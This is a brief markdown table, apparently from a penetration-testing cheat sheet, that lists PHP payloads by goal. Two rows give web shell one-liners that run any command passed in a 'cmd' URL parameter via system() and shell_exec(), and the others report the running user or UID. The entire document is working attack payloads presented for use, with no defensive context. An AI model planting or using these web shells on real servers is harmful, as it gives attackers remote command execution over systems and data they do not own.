|Goal|Payload|
|---|---|
|Full command output|`<?php system($_GET['cmd']); ?>`|
|Command output as string|`<?php echo shell_exec($_GET['cmd']); ?>`|
|Just the UID|`<?php echo posix_getuid(); ?>`|
|Who you're running as|`<?php system('whoami'); ?>`|
``